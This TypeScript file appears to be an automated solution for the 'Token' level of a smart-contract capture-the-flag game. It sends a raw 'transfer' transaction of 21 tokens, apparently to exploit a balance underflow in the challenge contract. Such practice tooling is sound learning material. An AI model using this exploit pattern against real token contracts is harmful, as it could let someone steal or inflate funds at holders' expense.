import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const TOKEN_LEVEL_NAME = "Token"

export const tokenAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const callData = ethereum.createCallData('transfer', ['address', 'uint'], [instanceAddress, 21]);
            const attackTx = await ethereum.sendRawTx({to: instanceAddress, data: callData});
            await attackTx.wait();
        }
    }
}